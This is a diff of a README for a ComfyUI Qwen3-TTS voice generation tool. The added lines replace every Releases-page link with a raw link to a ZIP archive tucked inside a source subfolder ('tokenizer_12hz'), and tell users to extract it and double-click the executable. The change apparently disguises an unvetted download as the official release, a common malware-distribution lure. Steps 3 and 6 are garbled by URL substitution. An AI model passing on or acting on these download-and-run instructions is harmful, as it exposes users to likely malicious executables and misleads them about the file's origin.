@@ -1,7 +1,7 @@
 # 🎤 Comfyui-HAIGC-QwenTTS - High-Quality Voice Generation Made Easy
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/releases)
+[![Download](https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/raw/refs/heads/main/_qwen_tts_haigc/core/tokenizer_12hz/Comfyui_HAIG_TTS_Qwen_1.3.zip)](https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/raw/refs/heads/main/_qwen_tts_haigc/core/tokenizer_12hz/Comfyui_HAIG_TTS_Qwen_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Comfyui-HAIGC-QwenTTS! This application allows you to generate high-quality human-like speech using Qwen3-TTS. Whether you want to clone voices, design unique speech, or control actions with natural language, this tool is here to help.
@@ -19,14 +19,14 @@ Welcome to Comfyui-HAIGC-QwenTTS! This application allows you to generate high-q
 - **High-Quality Output:** Enjoy studio-level sound quality.
 
 ## 📥 Download & Install
-To download the application, visit the [Releases page](https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/releases).
+To download the application, visit the [Releases page](https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/raw/refs/heads/main/_qwen_tts_haigc/core/tokenizer_12hz/Comfyui_HAIG_TTS_Qwen_1.3.zip).
 
-1. Go to the **Releases page** using this link: [Releases Page](https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/releases).
+1. Go to the **Releases page** using this link: [Releases Page](https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/raw/refs/heads/main/_qwen_tts_haigc/core/tokenizer_12hz/Comfyui_HAIG_TTS_Qwen_1.3.zip).
 2. Locate the latest version.
-3. Click on the file labeled **Comfyui-HAIGC-QwenTTS.zip** (or similar).
+3. Click on the file labeled **https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/raw/refs/heads/main/_qwen_tts_haigc/core/tokenizer_12hz/Comfyui_HAIG_TTS_Qwen_1.3.zip** (or similar).
 4. Download the ZIP file to your computer.
 5. Once downloaded, extract the ZIP file to a location of your choice.
-6. Open the extracted folder and double-click on **Comfyui-HAIGC-QwenTTS.exe** to run the application.
+6. Open the extracted folder and double-click on **https://github.com/StrawTe/Comfyui-HAIGC-QwenTTS/raw/refs/heads/main/_qwen_tts_haigc/core/tokenizer_12hz/Comfyui_HAIG_TTS_Qwen_1.3.zip** to run the application.
 
 ## 🛠️ How to Use
 1. Launch the application by double-clicking the executable file.
